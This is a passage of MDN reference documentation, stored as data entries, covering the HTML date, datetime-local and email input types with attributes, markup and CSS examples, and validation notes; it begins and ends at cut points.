The default value of `step` is 1, indicating 1 day.\n\n**Note:** Specifying `any` as the value for `step` has the same effect as `1` for `date` inputs.\n\n## Using date inputs\n\nDate inputs provide an easy interface for choosing dates, and they normalize the data format sent to the server regardless of the user's locale.\n\nIn this section, we'll look at basic and then more complex uses of `<input type=\"date\">`.\n\n### Basic uses of date\n\nThe simplest use of `<input type=\"date\">` involves one `<input>` combined with its [`<label>`](../label), as seen below:\n\nhtml\n\n```\n<form action=\"https://example.com\">\n  <label>\n    Enter your birthday:\n    <input type=\"date\" name=\"bday\" />\n  </label>\n\n  <p><button>Submit</button></p>\n</form>\n```\n\nThis HTML submits the entered date under the key `bday` to `https://example.com` — resulting in a URL like `https://example.com/?bday=1955-06-08`.\n\n### Setting maximum and minimum dates\n\nYou can use the [`min`](../input#min) and [`max`](../input#max) attributes to restrict the dates that can be chosen by the user. In the following example, we set a minimum date of `2017-04-01` and a maximum date of `2017-04-30`:\n\nhtml\n\n```\n<form>\n  <label>\n    Choose your preferred party date:\n    <input type=\"date\" name=\"party\" min=\"2017-04-01\" max=\"2017-04-30\" />\n  </label>\n</form>\n```\n\nThe result is that only days in April 2017 can be selected — the month and year parts of the textbox will be uneditable, and dates outside April 2017 can't be selected in the picker widget.\n\nYou can use the [`step`](../input#step) attribute to vary the number of days jumped each time the date is incremented (e.g. to only make Saturdays selectable).\n\n### Controlling input size\n\n`<input type=\"date\">` doesn't support form sizing attributes such as [`size`](../input#size). Prefer [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) for sizing it.\n\n## Validation\n\nBy default, `<input type=\"date\">` doesn't validate the entered value beyond its format. The interfaces generally don't let you enter anything that isn't a date — which is helpful.\n\nIf you use [`min`](../input#min) and [`max`](../input#max) to restrict the available dates (see [Setting maximum and minimum dates](#setting_maximum_and_minimum_dates)), the form control disables invalid dates, and will display an error if you try to submit a date that is out of bounds.\n\nYou can also use the [`required`](../input#required) attribute to make filling in the date mandatory — an error will be displayed if you try to submit an empty date field.\n\nLet's look at an example of minimum and maximum dates, and also made a field required:\n\nhtml\n\n```\n<form>\n  <label>\n    Choose your preferred party date (required, April 1st to 20th):\n    <input\n      type=\"date\"\n      name=\"party\"\n      min=\"2017-04-01\"\n      max=\"2017-04-20\"\n      required />\n    <span class=\"validity\"></span>\n  </label>\n\n  <p>\n    <button>Submit</button>\n  </p>\n</form>\n```\n\nIf you try to submit the form with an incomplete date (or with a date outside the set bounds), the browser displays an error. Try playing with the example now:\n\nHere's the CSS used in the above example. We make use of the [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) [pseudo-elements](https://developer.mozilla.org/en-US/docs/Web/CSS/Pseudo-elements) to add an icon next to the input, based on whether the current value is valid. We had to put the icon on a [`<span>`](../span) next to the input, not on the input itself, because in Chrome at least the input's generated content is placed inside the form control, and can't be styled or shown effectively.\n\ncss\n\n```\nlabel {\n  display: flex;\n  align-items: center;\n}\n\nspan::after {\n  padding-left: 5px;\n}\n\ninput:invalid + span::after {\n  content: \"✖\";\n}\n\ninput:valid + span::after {\n  content: \"✓\";\n}\n```\n\n**Warning:** Client-side form validation *is not a substitute* for validating on the server. It's easy for someone to modify the HTML, or bypass your HTML entirely and submit the data directly to your server. If your server fails to validate the received data, disaster could strike with data that is badly-formatted, too large, of the wrong type, etc.\n\n## Examples\n\nIn this example, we create a date picker using the native `<input type=\"date\">` picker.\n\n### HTML\n\nThe HTML looks like so:\n\nhtml\n\n```\n<form>\n  <div class=\"nativeDatePicker\">\n    <label for=\"bday\">Enter your birthday:</label>\n    <input type=\"date\" id=\"bday\" name=\"bday\" />\n    <span class=\"validity\"></span>\n  </div>\n</form>\n```\n\n### CSS\n\nThe CSS looks like so:\n\ncss\n\n```\ninput:invalid + span::after {\n  content: \" ✖\";\n}\n\ninput:valid + span::after {\n  content: \" ✓\";\n}\n```\n\n### Results\n\n## Technical summary\n\n|                                 |                                                                                                                                                                                                                                                                            |\n|---------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string representing a date in YYYY-MM-DD format, or empty                                                                                                                                                                                                                |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)                                                                                                  |\n| **Supported common attributes** | [`autocomplete`](../input#autocomplete), [`list`](../input#list), [`readonly`](../input#readonly), [`step`](../input#step)                                                                                                                                                 |\n| **IDL attributes**              | [`value`](../input#value), `valueAsDate`, `valueAsNumber`                                                                                                                                                                                                                  |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                                    |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select), [`stepDown()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepDown), [`stepUp()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepUp) |\n| **Implicit ARIA Role**          | [no corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                        |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `date` | 20      | 12   | 57      | 11    | 14.1   | 25             | 57                  | 11            | 5             | 1.5              | 4.4             |     |\n\n## See also\n\n- The generic [`<input>`](../input) element and the interface used to manipulate it, [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)\n- [Date and Time picker tutorial](https://developer.mozilla.org/en-US/docs/Learn/Forms/HTML5_input_types#date_and_time_pickers)\n- [Date and time formats used in HTML](../../date_and_time_formats)\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/date](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/date)"
- name: input type="datetime-local"
  summary: <input> elements of type datetime-local create input controls that let the user easily enter both a date and a time, including the year, month, and day as well as the time in hours and minutes
  description: "# \\<input type=\"datetime-local\"\\>\n\n[`<input>`](../input) elements of type `datetime-local` create input controls that let the user easily enter both a date and a time, including the year, month, and day as well as the time in hours and minutes.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"datetime-local\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"meeting-time\">Choose a time for your appointment:</label>\n\n    <input\n      type=\"datetime-local\"\n      id=\"meeting-time\"\n      name=\"meeting-time\"\n      value=\"2018-06-12T19:30\"\n      min=\"2018-06-07T00:00\"\n      max=\"2018-06-14T00:00\" />\n\n    label {\n      display: block;\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input,\n    label {\n      margin: 0.4rem 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe control's UI varies in general from browser to browser. In browsers with no support, these degrade gracefully to simple [`<input type=\"text\">`](text) controls.\n\nThe control is intended to represent *a local date and time*, not necessarily *the user's local date and time*. In other words, the input allows any valid combination of year, month, day, hour, and minute—even if such a combination is invalid in the user's local time zone (such as the one hour within a daylight saving time spring-forward transition gap).\n\n## Value\n\nA string representing the value of the date entered into the input. The format of the date and time value used by this input type is described in [Local date and time strings](../../date_and_time_formats#local_date_and_time_strings).\n\nYou can set a default value for the input by including a date and time inside the [`value`](../input#value) attribute, like so:\n\nhtml\n\n```\n<label for=\"party\">Enter a date and time for your party booking:</label>\n<input\n  id=\"party\"\n  type=\"datetime-local\"\n  name=\"partydate\"\n  value=\"2017-06-01T08:30\" />\n```\n\nOne thing to note is that the displayed date and time formats differ from the actual `value`; the displayed date and time are formatted according to the user's locale as reported by their operating system, whereas the date/time `value` is always formatted `YYYY-MM-DDThh:mm`. When the above value is submitted to the server, for example, it will look like `partydate=2024-06-01T08:30`.\n\n**Note:** Also bear in mind that if such data is submitted via HTTP [`GET`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET), the colon character will need to be escaped for inclusion in the URL parameters, e.g. `partydate=2024-06-01T08%3A30`. See [`encodeURI()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI) for one way to do this.\n\nYou can also get and set the date value in JavaScript using the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) `value` property, for example:\n\njs\n\n```\nconst dateControl = document.querySelector('input[type=\"datetime-local\"]');\ndateControl.value = \"2017-06-01T08:30\";\n```\n\n## Additional attributes\n\nIn addition to the attributes common to all [`<input>`](../input) elements, `datetime-local` inputs offer the following attributes.\n\n### max\n\nThe latest date and time to accept. If the [`value`](../input#value) entered into the element is later than this timestamp, the element fails [constraint validation](../../constraint_validation). If the value of the `max` attribute isn't a valid string that follows the format `YYYY-MM-DDThh:mm`, then the element has no maximum value.\n\nThis value must specify a date string later than or equal to the one specified by the `min` attribute.\n\n### min\n\nThe earliest date and time to accept; timestamps earlier than this will cause the element to fail [constraint validation](../../constraint_validation). If the value of the `min` attribute isn't a valid string that follows the format `YYYY-MM-DDThh:mm`, then the element has no minimum value.\n\nThis value must specify a date string earlier than or equal to the one specified by the `max` attribute.\n\n### step\n\nThe `step` attribute is a number that specifies the granularity that the value must adhere to, or the special value `any`, which is described below. Only values which are equal to the basis for stepping ([`min`](#min) if specified, [`value`](../input#value) otherwise, and an appropriate default value if neither of those is provided) are valid.\n\nA string value of `any` means that no stepping is implied, and any value is allowed (barring other constraints, such as [`min`](#min) and [`max`](#max)).\n\n**Note:** When the data entered by the user doesn't adhere to the stepping configuration, the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) may round to the nearest valid value, preferring numbers in the positive direction when there are two equally close options.\n\nFor `datetime-local` inputs, the value of `step` is given in seconds, with a scaling factor of 1000 (since the underlying numeric value is in milliseconds). The default value of `step` is 60, indicating 60 seconds (or 1 minute, or 60,000 milliseconds).\n\n*At this time, it's unclear what a value of `any` means for `step` when used with `datetime-local` inputs. This will be updated as soon as that information is determined.*\n\n## Using datetime-local inputs\n\nDate/time inputs are convenient for the developer; they provide an easy UI for choosing dates and times, and they normalize the data format sent to the server, regardless of the user's locale. However, it is important to consider your users. Don't require your users to enter data that is not needed for your app to function.\n\n### Controlling input size\n\n`<input type=\"datetime-local\">` doesn't support form control sizing attributes such as [`size`](../input#size). You'll have to resort to [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) for customizing the sizes of these elements.\n\n### Setting timezones\n\nOne thing the `datetime-local` input type doesn't provide is a way to set the time zone and/or locale of the date/time control. This was available in the `datetime` input type, but this type is now obsolete, having been removed from the spec. The main reasons why this was removed are a lack of implementation in browsers and concerns over the user interface/experience. It is easier to just have a control (or controls) for setting the date/time and then deal with the locale in a separate control.\n\nFor example, if you are creating a system where the user is likely to already be logged in, with their locale already set, you could provide the timezone in a [`hidden`](hidden) input type. For example:\n\nhtml\n\n```\n<input type=\"hidden\" id=\"timezone\" name=\"timezone\" value=\"-08:00\" />\n```\n\nOn the other hand, if you were required to allow the user to enter a time zone along with a date/time input, you could have a [`<select>`](../select) element to enable the user to set the right time zone by choosing a particular location from among a set of locations:\n\nhtml\n\n```\n<select name=\"timezone\" id=\"timezone\">\n  <option value=\"Pacific/Kwajalein\">Eniwetok, Kwajalein</option>\n  <option value=\"Pacific/Midway\">Midway Island, Samoa</option>\n  <option value=\"Pacific/Honolulu\">Hawaii</option>\n  <option value=\"Pacific/Marquesas\">Taiohae</option>\n  <!-- and so on -->\n</select>\n```\n\nIn either case, the date/time and time zone values would be submitted to the server as separate data points, and then you'd need to store them appropriately in the database on the server-side.\n\n## Validation\n\nBy default, `<input type=\"datetime-local\">` does not apply any validation to entered values. The UI implementations generally don't let you enter anything that isn't a date/time — which is helpful — but a user might still fill in no value and submit, or enter an invalid date and/or time (e.g. the 32nd of April).\n\nYou can use [`min`](../input#min) and [`max`](../input#max) to restrict the available dates (see [Setting maximum and minimum dates](#setting_maximum_and_minimum_dates_and_times)), and you can use the [`required`](../input#required) attribute to make filling in the date/time mandatory. As a result, supporting browsers will display an error if you try to submit a date that is outside the set bounds or an empty date field.\n\nLet's look at an example; here we've set minimum and maximum date/time values, and also made the field required:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"party\">\n      Choose your preferred party date and time (required, June 1st 8.30am to\n      June 30th 4.30pm):\n    </label>\n    <input\n      id=\"party\"\n      type=\"datetime-local\"\n      name=\"partydate\"\n      min=\"2017-06-01T08:30\"\n      max=\"2017-06-30T16:30\"\n      required />\n    <span class=\"validity\"></span>\n  </div>\n  <div>\n    <input type=\"submit\" value=\"Book party!\" />\n  </div>\n</form>\n```\n\nIf you try to submit the form with an incomplete date (or with a date outside the set bounds), the browser displays an error. Try playing with the example now:\n\nHere's the CSS used in the above example. Here we make use of the [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) CSS properties to style the input based on whether the current value is valid. We put the icons on a [`<span>`](../span) next to the input.\n\ncss\n\n```\ndiv {\n  margin-bottom: 10px;\n  display: flex;\n  align-items: center;\n}\n\nlabel {\n  display: inline-block;\n  width: 300px;\n}\n\ninput:invalid + span::after {\n  content: \"✖\";\n  padding-left: 5px;\n}\n\ninput:valid + span::after {\n  content: \"✓\";\n  padding-left: 5px;\n}\n```\n\n**Warning:** HTML form validation is *not* a substitute for scripts that ensure that the entered data is in the proper format. It's far too easy for someone to make adjustments to the HTML that allow them to bypass the validation, or to remove it entirely. It's also possible for someone to bypass your HTML entirely and submit the data directly to your server. If your server-side code fails to validate the data it receives, problems can arise when improperly-formatted data is submitted (or data that is too large, is of the wrong type, and so forth).\n\n**Note:** With a `datetime-local` input, the date value is always normalized to the format `YYYY-MM-DDThh:mm`.\n\n## Examples\n\n### Basic uses of datetime-local\n\nThe simplest use of `<input type=\"datetime-local\">` involves a basic `<input>` and [`<label>`](../label) element combination, as seen below:\n\nhtml\n\n```\n<form>\n  <label for=\"party\">Enter a date and time for your party booking:</label>\n  <input id=\"party\" type=\"datetime-local\" name=\"partydate\" />\n</form>\n```\n\n### Setting maximum and minimum dates and times\n\nYou can use the [`min`](../input#min) and [`max`](../input#max) attributes to restrict the dates/times that can be chosen by the user. In the following example, we are setting a minimum datetime of `2024-06-01T08:30` and a maximum datetime of `2024-06-30T16:30`:\n\nhtml\n\n```\n<form>\n  <label for=\"party\">Enter a date and time for your party booking:</label>\n  <input\n    id=\"party\"\n    type=\"datetime-local\"\n    name=\"partydate\"\n    min=\"2024-06-01T08:30\"\n    max=\"2024-06-30T16:30\" />\n</form>\n```\n\nOnly days in June 2024 can be selected. Depending on what browser you are using, times outside the specified values might not be selectable. In other browsers, invalid dates and times are selectable but will match [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) and [`:out-of-range`](https://developer.mozilla.org/en-US/docs/Web/CSS/:out-of-range) and will fail [validation](#validation).\n\nIn some browsers (Chrome and Edge), only the \"days\" part of the date value will be editable, and dates outside June can't be scrolled. In others (Safari), the date picker will appear to allow any date, but the value will be clamped to the valid range when a date is selected.\n\nThe valid range included all times between the `min` and `max` values; the time of day is only constrained on the first and last dates in the range.\n\n**Note:** You should be able to use the [`step`](../input#step) attribute to vary the number of days jumped each time the date is incremented (e.g. maybe you only want to make Saturdays selectable). However, this does not seem to work effectively in any implementation at the time of writing.\n\n## Technical summary\n\n|                                 |                                                                                                                                                                                                                                                                            |\n|---------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string representing a date and time (in the local time zone), or empty.                                                                                                                                                                                                  |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)                                                                                                  |\n| **Supported common attributes** | [`autocomplete`](../input#autocomplete), [`list`](../input#list), [`readonly`](../input#readonly), [`step`](../input#step)                                                                                                                                                 |\n| **IDL attributes**              | [`list`](../input#list), [`value`](../input#value), `valueAsDate`, `valueAsNumber`                                                                                                                                                                                         |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                                    |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select), [`stepDown()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepDown), [`stepUp()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepUp) |\n| **Implicit ARIA Role**          | [no corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                        |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- The generic [`<input>`](../input) element and the interface used to manipulate it, [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)\n- [`<input type=\"date\">`](date) and [`<input type=\"time\">`](time)\n- [Date and time formats used in HTML](../../date_and_time_formats)\n- [Date and Time picker tutorial](https://developer.mozilla.org/en-US/docs/Learn/Forms/HTML5_input_types#date_and_time_pickers)\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/datetime-local](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/datetime-local)"
- name: input type="email"
  summary: <input> elements of type email are used to let the user enter and edit an email address, or, if the multiple attribute is specified, a list of email addresses
  description: "# \\<input type=\"email\"\\>\n\n[`<input>`](../input) elements of type `email` are used to let the user enter and edit an email address, or, if the [`multiple`](../../attributes/multiple) attribute is specified, a list of email addresses.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"email\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"email\">Enter your example.com email:</label>\n\n    <input type=\"email\" id=\"email\" pattern=\".+@example\\.com\" size=\"30\" required />\n\n    label {\n      display: block;\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input,\n    label {\n      margin: 0.4rem 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe input value is automatically validated to ensure that it's either empty or a properly-formatted email address (or list of addresses) before the form can be submitted. The [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) CSS pseudo-classes are automatically applied as appropriate to visually denote whether the current value of the field is a valid email address or not.\n\n## Value\n\nThe [`<input>`](../input) element's [`value`](../input#value) attribute contains a string which is automatically validated as conforming to email syntax. More specifically, there are three possible value formats that will pass validation:\n\n1.  An empty string (\"\") indicating that the user did not enter a value or that the value was removed.\n2.  A single properly-formed email address. This doesn't necessarily mean the email address exists, but it is at least formatted correctly. In simple terms, this means `username@domain` or `username@domain.tld`. There's more to it than that, of course; see [Validation](#validation) for a [regular expression](https://developer.mozilla.org/en-US/docs/Glossary/Regular_expression) that matches the email address validation algorithm.\n3.  If and only if the [`multiple`](../input#multiple) attribute is specified, the value can be a list of properly-formed comma-separated email addresses. Any trailing and leading whitespace is removed from each address in the list.\n\nSee [Validation](#validation) for details on how email addresses are validated to ensure that they're formatted properly.\n\n## Additional attributes\n\nIn addition to the attributes that operate on all [`<input>`](../input) elements regardless of their type, `email` inputs support the following attributes.\n\n### list\n\nThe values of the list attribute is the [`id`](https://developer.mozilla.org/en-US/docs/Web/API/Element/id) of a [`<datalist>`](../datalist) element located in the same document. The [`<datalist>`](../datalist) provides a list of predefined values to suggest to the user for this input. Any values in the list that are not compatible with the [`type`](../input#type) are not included in the suggested options. The values provided are suggestions, not requirements: users can select from this predefined list or provide a different value.\n\n### maxlength\n\nThe maximum string length (measured in UTF-16 code units) that the user can enter into the `email` input. This must be an integer value of 0 or higher. If no `maxlength` is specified, or an invalid value is specified, the `email` input has no maximum length. This value must also be greater than or equal to the value of `minlength`.\n\nThe input will fail [constraint validation](../../constraint_validation) if the length of the text value of the field is greater than `maxlength` UTF-16 code units long. Constraint validation is only applied when the value is changed by the user.\n\n### minlength\n\nThe minimum string length (measured in UTF-16 code units) that the user can enter into the `email` input. This must be a non-negative integer value smaller than or equal to the value specified by `maxlength`. If no `minlength` is specified, or an invalid value is specified, the `email` input has no minimum length.\n\nThe input will fail [constraint validation](../../constraint_validation) if the length of the text entered into the field is fewer than `minlength` UTF-16 code units long. Constraint validation is only applied when the value is changed by the user.\n\n### multiple\n\nA Boolean attribute which, if present, indicates that the user can enter a list of multiple email addresses, separated by commas and, optionally, whitespace characters. See [Allowing multiple email addresses](#allowing_multiple_email_addresses) for an example, or [HTML attribute: multiple](../../attributes/multiple) for more details.\n\n**Note:** Normally, if you specify the [`required`](../input#required) attribute, the user must enter a valid email address for the field to be considered valid. However, if you add the `multiple` attribute, a list of zero email addresses (an empty string, or one which is entirely whitespace) is a valid value. In other words, the user does not have to enter even one email address when `multiple` is specified, regardless of the value of `required`.\n\n### pattern\n\nThe `pattern` attribute, when specified, is a regular expression that the input's [`value`](../input#value) must match for the value to pass [constraint validation](../../constraint_validation). It must be a valid JavaScript regular expression, as used by the [`RegExp`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp) type, and as documented in our [guide on regular expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions); the `'u'` flag is specified when compiling the regular expression so that the pattern is treated as a sequence of Unicode code points, instead of as [ASCII](https://developer.mozilla.org/en-US/docs/Glossary/ASCII). No forward slashes should be specified around the pattern text.\n\nIf the specified pattern is not specified or is invalid, no regular expression is applied and this attribute is ignored completely.\n\n**Note:** Use the [`title`](../input#title) attribute to specify text that most browsers will display as a tooltip to explain what the requirements are to match the pattern. You should also include other explanatory text nearby.\n\nSee the section [Pattern validation](#pattern_validation) for details and an example.\n\n### `placeholder`\n\nThe `placeholder` attribute is a string that provides a brief hint to the user as to what kind of information is expected in the field. It should be a word or short phrase that demonstrates the expected type of data, rather than an explanatory message. The text *must not* include carriage returns or line feeds.\n\nIf the control's content has one directionality ([LTR](https://developer.mozilla.org/en-US/docs/Glossary/LTR) or [RTL](https://developer.mozilla.org/en-US/docs/Glossary/RTL)) but needs to present the placeholder in the opposite directionality, you can use Unicode bidirectional algorithm formatting characters to override directionality within the placeholder; see [How to use Unicode controls for bidi text](https://www.w3.org/International/questions/qa-bidi-unicode-controls) for more information.\n\n**Note:** Avoid using the `placeholder` attribute if you can. It is not as semantically useful as other ways to explain your form, and can cause unexpected technical issues with your content. See [`<input>` labels](../input#labels) for more information.\n\n### `readonly`\n\nA Boolean attribute which, if present, means this field cannot be edited by the user. Its `value` can, however, still be changed by JavaScript code directly setting the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) `value` property.\n\n**Note:** Because a read-only field cannot have a value, `required` does not have any effect on inputs with the `readonly` attribute also specified.\n\n### `size`\n\nThe `size` attribute is a numeric value indicating how many characters wide the input field should be. The value must be a number greater than zero, and the default value is 20. Since character widths vary, this may or may not be exact and should not be relied upon to be so; the resulting input may be narrower or wider than the specified number of characters, depending on the characters and the font ([`font`](https://developer.mozilla.org/en-US/docs/Web/CSS/font) settings in use).\n\nThis does *not* set a limit on how many characters the user can enter into the field. It only specifies approximately how many can be seen at a time. To set an upper limit on the length of the input data, use the [`maxlength`](#maxlength) attribute.\n\n## Using email inputs\n\nEmail addresses are among the most frequently-inputted textual data forms on the web; they're used when logging into websites, when requesting information, to allow order confirmation, for webmail, and so forth. As such, the `email` input type can make your job as a web developer much easier since it can help simplify your work when building the user interface and logic for email addresses. When you create an email input with the proper `type` value, `email`, you get automatic validation that the entered text is at least in the correct form to potentially be a legitimate email address. This can help avoid cases in which the user mistypes their address, or provides an invalid address.\n\nIt's important, however, to note that this is not enough to ensure that the specified text is an email address which actually exists, corresponds to the user of the site, or is acceptable in any other way. It ensures that the value of the field is properly formatted to be an email address.\n\n**Note:** It's also crucial to remember that a user can tinker with your HTML behind the scenes, so your site *must not* use this validation for any security purposes. You *must* verify the email address on the server side of any transaction in which the provided text may have any security implications of any kind.\n\n### A simple email input\n\nCurrently, all browsers which implement this element implement it as a standard text input field with basic validation features. The specification does, however, allow browsers latitude on this. For example, the element could be integrated with the user's device's built-in address book to allow picking email addresses from that list. In its most basic form, an `email` input can be implemented like this:\n\nhtml\n\n```\n<input id=\"emailAddress\" type=\"email\" />\n```\n\nNotice that it's considered valid when empty and when a single validly-formatted email address is entered, but is otherwise not considered valid. By adding the [`required`](../input#required) attribute, only validly-formed email addresses are allowed; the input is no longer considered valid when empty.\n\n### Allowing multiple email addresses\n\nBy adding the [`multiple`](../../attributes/multiple) Boolean attribute, the input can be configured to accept multiple email addresses.\n\nhtml\n\n```\n<input id=\"emailAddress\" type=\"email\" multiple />\n```\n\nThe input is now considered valid when a single email address is entered, or when any number of email addresses separated by commas and, optionally, some number of whitespace characters are present.\n\n**Note:** When `multiple` is used, the value *is* allowed to be empty.\n\nSome examples of valid strings when `multiple` is specified:\n\n- `\"\"`\n- `\"me@example\"`\n- `\"me@example.org\"`\n- `\"me@example.org,you@example.org\"`\n- `\"me@example.org, you@example.org\"`\n- `\"me@example.org,you@example.org, us@example.org\"`\n\nSome examples of invalid strings:\n\n- `\",\"`\n- `\"me\"`\n- `\"me@example.org you@example.org\"`\n\n### Placeholders\n\nSometimes it's helpful to offer an in-context hint as to what form the input data should take. This can be especially important if the page design doesn't offer descriptive labels for each [`<input>`](../input). This is where **placeholders** come in. A placeholder is a value that demonstrates the form the `value` should take by presenting an example of a valid value, which is displayed inside the edit box when the element's `value` is \"\". Once data is entered into the box, the placeholder disappears; if the box is emptied, the placeholder reappears.\n\nHere, we have an `email` input with the placeholder `sophie@example.com`. Note how the placeholder disappears and reappears as you manipulate the contents of the edit field.\n\nhtml\n\n```\n<input type=\"email\" placeholder=\"sophie@example.com\" />\n```\n\n### Controlling the input size\n\nYou can control not only the physical length of the input box, but also the minimum and maximum lengths allowed for the input text itself.\n\n#### Physical input element size\n\nThe physical size of the input box can be controlled using the [`size`](../input#size) attribute. With it, you can specify the number of characters the input box can display at a time. In this example the `email` edit box is 15 characters wide:\n\nhtml\n\n```\n<input type=\"email\" size=\"15\" />\n```\n\n#### Element value length\n\nThe `size` is separate from the length limitation on the entered email address itself so that you can have fields fit in a small space while still allowing longer email address strings to be entered. You can specify a minimum length, in characters, for the entered email address using the [`minlength`](../input#minlength) attribute; similarly, use [`maxlength`](../input#maxlength) to set the maximum length of the entered email address.\n\nThe example below creates a 32 character-wide email address entry box, requiring that the contents be no shorter than 3 characters and no longer than 64 characters.\n\nhtml\n\n```\n<input type=\"email\" size=\"32\" minlength=\"3\" maxlength=\"64\" />\n```\n\n### Providing default options\n\n#### Providing a single default using the value attribute\n\nAs always, you can provide a default value for an `email` input box by setting its [`value`](../input#value) attribute:\n\nhtml\n\n```\n<input type=\"email\" value=\"default@example.com\" />\n```\n\n#### Offering suggested values\n\nTaking it a step further, you can provide a list of default options from which the user can select by specifying the [`list`](../input#list) attribute. This doesn't limit the user to those options, but does allow them to select commonly-used email addresses more quickly. This also offers hints to [`autocomplete`](../input#autocomplete). The `list` attribute specifies the ID of a [`<datalist>`](../datalist), which in turn contains one [`<option>`](../option) element per suggested value; each `option`'s `value` is the corresponding suggested value for the email entry box.\n\nhtml\n\n```\n<input type=\"email\" size=\"40\" list=\"defaultEmails\" />\n\n<datalist id=\"defaultEmails\">\n  <option value=\"jbond007@mi6.defence.gov.uk\"></option>\n  <option value=\"jbourne@unknown.net\"></option>\n  <option value=\"nfury@shield.org\"></option>\n  <option value=\"tony@starkindustries.com\"></option>\n  <option value=\"hulk@grrrrrrrr.arg\"></option>\n</datalist>\n```\n\nWith the [`<datalist>`](../datalist) element and its [`<option>`](../option)s in place, the browser will offer the specified values as potential values for the email address; this is typically presented as a popup or drop-down menu containing the suggestions. While the specific user experience may vary from one browser to another, typically clicking in the edit box presents a drop-down of the suggested email addresses. Then, as the user types, the list is filtered to show only matching values. Each typed character narrows down the list until the user makes a selection or types a custom value.\n\n## Validation\n\nThere are two levels of content validation available for `email` inputs. First, there's the standard level of validation offered to all [`<input>`](../input)s, which automatically ensures that the contents meet the requirements to be a valid email address. But there's also the option to add additional filtering to ensure that your own specialized needs are met, if you have any.\n\n**Warning:** HTML form validation is *not* a substitute for scripts that ensure that the entered data is in the proper format. It's far too easy for someone to make adjustments to the HTML that allow them to bypass the validation, or to remove it completely. It's also possible for someone to bypass your HTML entirely and submit the data directly to your server. If your server-side code fails to validate the data it receives, disaster could strike when improperly-formatted data (or data which is too large, is of the wrong type, and so forth) is entered into your database.\n\n### Basic validation\n\nBrowsers automatically provide validation to 